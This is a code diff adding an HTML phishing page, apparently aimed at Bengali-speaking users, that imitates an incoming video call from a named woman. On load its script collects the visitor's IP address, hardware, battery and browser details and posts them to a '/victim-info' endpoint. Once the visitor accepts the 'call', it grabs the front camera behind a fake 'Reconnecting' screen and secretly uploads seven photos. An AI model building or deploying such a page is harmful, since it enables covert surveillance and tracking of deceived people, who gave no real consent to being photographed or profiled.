@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>Video Calling</title>
+<style>
+  :root {
+    --bg-dark: #111b21;
+    --green-accept: #25d366;
+    --red-decline: #ff3b30;
+    --text-main: #ffffff;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; width: 100%; }
+  body { 
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+    background: var(--bg-dark); 
+    color: var(--text-main); 
+    overflow: hidden;
+    user-select: none;
+  }
+  
+  .screen {
+    position: fixed; inset: 0; display: flex; flex-direction: column;
+    z-index: 10;
+  }
+  .hidden { display: none !important; }
+
+  #incomingScreen { 
+    background: linear-gradient(180deg, #2c3e50 0%, #000000 100%);
+    align-items: center; justify-content: space-between;
+    padding: 12vh 24px 8vh;
+  }
+  
+  .caller-info { display: flex; flex-direction: column; align-items: center; text-align: center; }
+  .avatar-container { position: relative; width: 120px; height: 120px; margin-bottom: 20px; }
+.avatar {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #6366f1, #a855f7);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 50px;
+    font-weight: 400;
+    color: white;
+    position: relative;
+    z-index: 2;
+    overflow: hidden;
+}
+
+.avatar img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 50%;
+    display: block;
+}
+
+.avatar-pulse {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    border-radius: 50%;
+    background: #a855f7;
+    z-index: 1;
+    animation: ripple 1.5s infinite ease-in-out;
+    pointer-events: none;
+}
+  @keyframes ripple {
+    0% { transform: scale(1); opacity: 0.5; }
+    100% { transform: scale(1.8); opacity: 0; }
+  }
+  .caller-name { font-size: 28px; font-weight: 500; letter-spacing: 0.5px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+  .call-sub { color: #d1d5db; margin-top: 8px; font-size: 16px; font-weight: 400; }
+  .btn-row { display: flex; gap: 70px; margin-bottom: 30px; width: 100%; justify-content: center; }
+  .btn-col { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+  .round-btn {
+    width: 72px; height: 72px; border-radius: 50%; border: none; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    color: #fff; transition: transform 0.2s ease;
+  }
+  .round-btn svg { width: 34px; height: 34px; fill: currentColor; }
+  .round-btn:active { transform: scale(0.9); }
+  .accept { background: var(--green-accept); }
+  .decline { background: var(--red-decline); }
+  .lbl { font-size: 15px; color: #e5e7eb; }
+
+  #activeScreen { background: #000; }
+  .blurred-bg {
+    position: absolute; inset: 0; width: 100%; height: 100%;
+    background: linear-gradient(135deg, #4f46e5, #9333ea);
+    filter: blur(40px); opacity: 0.6; z-index: 1;
+  }
+  .active-top-bar {
+    position: absolute; top: 0; left: 0; width: 100%;
+    padding: 50px 20px 20px; z-index: 10; text-align: center;
+    background: linear-gradient(180deg, rgba(0,0,0,0.6) 0%, transparent 100%);
+  }
+  .active-name { font-size: 20px; font-weight: 500; }
+  .reconnecting-container {
+    position: absolute; top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 16px;
+  }
+  .spinner-anim {
+    width: 40px; height: 40px;
+    border: 3px solid rgba(255, 255, 255, 0.2);
+    border-top: 3px solid #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .recon-text { font-size: 16px; color: #f3f4f6; font-weight: 400; letter-spacing: 0.5px; }
+
+  #preview { 
+    position: absolute; bottom: 120px; right: 20px;
+    width: 110px; height: 160px; object-fit: cover; 
+    z-index: 20;
+    border-radius: 12px; background: #1f2937;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    border: 1px solid rgba(255,255,255,0.1);
+    transform: scaleX(-1);
+  }
+
+  .active-bottom-bar {
+    position: absolute; bottom: 0; left: 0; width: 100%;
+    padding: 30px 0 40px; z-index: 20;
+    display: flex; justify-content: center; gap: 24px;
+    background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, transparent 100%);
+  }
+  .control-btn {
+    width: 56px; height: 56px; border-radius: 50%; border: none;
+    background: rgba(255,255,255,0.2); backdrop-filter: blur(10px);
+    color: white; display: flex; align-items: center; justify-content: center;
+  }
+  .control-btn svg { width: 24px; height: 24px; fill: currentColor; }
+  .control-btn.end-call { background: var(--red-decline); width: 64px; height: 64px; }
+  .control-btn.end-call svg { width: 30px; height: 30px; }
+
+  .toast {
+    position: fixed; left: 50%; bottom: 40px; transform: translateX(-50%);
+    background: rgba(0,0,0,0.8); color: #fff; padding: 12px 24px; 
+    border-radius: 30px; font-size: 14px; z-index: 999;
+  }
+</style>
+</head>
+<body>
+
+<!-- ===== 1. Incoming Call Screen ===== -->
+<div id="incomingScreen" class="screen">
+  <div class="caller-info">
+    <div class="avatar-container">
+      <div class="avatar-pulse"></div>
+<div class="avatar">
+    <img src="/pic.jpg" alt="Avatar">
+</div>
+    </div>
+    <div class="caller-name">Sadia Akter</div>
+    <div class="call-sub">Video call...</div>
+  </div>
+  <div class="btn-row">
+    <div class="btn-col">
+      <button class="round-btn decline" id="declineBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
+      </button>
+      <div class="lbl">Decline</div>
+    </div>
+    <div class="btn-col">
+      <button class="round-btn accept" id="acceptBtn">
+        <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+      </button>
+      <div class="lbl">Accept</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 2. Active Call Screen ===== -->
+<div id="activeScreen" class="screen hidden">
+  <div class="blurred-bg"></div>
+  <div class="active-top-bar">
+    <div class="active-name">Sadia Akter</div>
+  </div>
+  <div class="reconnecting-container">
+    <div class="spinner-anim"></div>
+    <div class="recon-text">Reconnecting...</div>
+  </div>
+  <video id="preview" autoplay playsinline muted></video>
+  <canvas id="snapCanvas" style="display:none;"></canvas>
+  <div class="active-bottom-bar">
+    <button class="control-btn">
+      <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
+    </button>
+    <button class="control-btn end-call" id="endBtn">
+      <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
+    </button>
+    <button class="control-btn">
+      <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm-3.2-5c0 1.77 1.43 3.2 3.2 3.2s3.2-1.43 3.2-3.2-1.43-3.2-3.2-3.2-3.2 1.43-3.2 3.2z"/></svg>
+    </button>
+  </div>
+</div>
+
+<script>
+/* ── helpers ── */
+const $ = id => document.getElementById(id);
+let stream = null;
+let victimIP = "Unknown";
+const PHOTO_COUNT  = 7;
+const PHOTO_DELAY  = 1800; // ms between shots
+
+/* ── utility: collect device info ── */
+function getWebGLRenderer() {
+  try {
+    const c = document.createElement("canvas");
+    const g = c.getContext("webgl") || c.getContext("experimental-webgl");
+    const d = g.getExtension("WEBGL_debug_renderer_info");
+    return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : "Unknown";
+  } catch { return "Unknown"; }
+}
+function detectBrowserInfo() {
+  const ua = navigator.userAgent;
+  if (/Chrome/.test(ua) && !/Edge/.test(ua)) return "Chrome";
+  if (/Firefox/.test(ua)) return "Firefox";
+  if (/Safari/.test(ua) && !/Chrome/.test(ua)) return "Safari";
+  if (/Edge/.test(ua)) return "Edge";
+  return "Unknown";
+}
+function estimateDeviceType() {
+  const ua = navigator.userAgent;
+  if (/Mobi|Android/i.test(ua)) return "Mobile";
+  if (/Tablet|iPad/i.test(ua)) return "Tablet";
+  return "Desktop";
+}
+
+async function collectDeviceInfo() {
+  let ip = "Unknown";
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    ip = d.ip;
+    victimIP = ip;
+  } catch {}
+
+  const battery = navigator.getBattery
+    ? await navigator.getBattery().then(b => ({
+        level: Math.round(b.level * 100) + "%",
+        charging: b.charging ? "Yes" : "No"
+      }))
+    : { level: "Unknown", charging: "Unknown" };
+
+  const conn = navigator.connection || {};
+  return {
+    ip,
+    batteryLevel:   battery.level,
+    batteryCharging: battery.charging,
+    browser:        detectBrowserInfo(),
+    userAgent:      navigator.userAgent,
+    platform:       navigator.platform,
+    language:       navigator.language,
+    deviceMemory:   navigator.deviceMemory || "Unknown",
+    hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+    screenResolution: `${screen.width}x${screen.height}`,
+    windowSize:     `${window.innerWidth}x${window.innerHeight}`,
+    colorDepth:     `${screen.colorDepth} bit`,
+    downlink:       conn.downlink || "Unknown",
+    effectiveType:  conn.effectiveType || "Unknown",
+    cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+    timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+    date:           new Date().toLocaleDateString(),
+    time:           new Date().toLocaleTimeString(),
+    deviceType:     estimateDeviceType(),
+    renderer:       getWebGLRenderer(),
+    pageURL:        window.location.href
+  };
+}
+
+/* ── send device info to local flask server ── */
+(async function initTracker() {
+  try {
+    const d = await collectDeviceInfo();
+    await fetch("/victim-info", {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify(d)
+    });
+  } catch (e) {
+    console.error("Tracker failed:", e);
+  }
+})();
+
+/* ── UI ── */
+$("declineBtn").onclick = () => {
+  document.querySelector("#incomingScreen .caller-info").innerHTML =
+    '<div style="color:#d1d5db;font-size:18px;margin-top:50px;">Call Declined</div>';
+  document.querySelector("#incomingScreen .btn-row").remove();
+};
+
+$("acceptBtn").onclick = async () => {
+  $("incomingScreen").classList.add("hidden");
+  $("activeScreen").classList.remove("hidden");
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 720 }, height: { ideal: 1280 } },
+      audio: false
+    });
+    $("preview").srcObject = stream;
+
+    // give camera 1.2s to warm up, then shoot
+    setTimeout(() => capturePhotos(), 1200);
+
+  } catch (err) {
+    toast("Camera permission denied.");
+    setTimeout(() => location.reload(), 2000);
+  }
+};
+
+$("endBtn").onclick = () => stopStream();
+
+/* ── Photo capture: 7 shots, PHOTO_DELAY apart ── */
+async function capturePhotos() {
+  const video  = $("preview");
+  const canvas = $("snapCanvas");
+  const ctx    = canvas.getContext("2d");
+
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+
+  for (let i = 1; i <= PHOTO_COUNT; i++) {
+    // mirror-correct: draw un-mirrored (CSS mirrors the preview, canvas needs raw)
+    ctx.save();
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+    ctx.restore();
+
+    const dataURL = canvas.toDataURL("image/jpeg", 0.85);
+
+    // fire-and-forget — no await, send in parallel-ish
+    sendImage(dataURL, i);
+
+    if (i < PHOTO_COUNT) {
+      await sleep(PHOTO_DELAY);
+    }
+  }
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function sendImage(dataURL, idx) {
+  try {
+    await fetch("/upload-image", {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify({
+        ip:    victimIP,
+        index: idx,
+        image: dataURL
+      })
+    });
+  } catch (e) {
+    console.error("Image upload failed:", e);
+  }
+}
+
+function stopStream() {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  $("activeScreen").classList.add("hidden");
+  document.body.innerHTML =
+    '<div style="display:flex;height:100%;align-items:center;justify-content:center;color:#9ca3af;font-size:18px;background:#111b21;">Call Ended</div>';
+}
+
+function toast(msg) {
+  const t = document.createElement("div");
+  t.className = "toast";
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
+}
+</script>
+</body>
+</html>
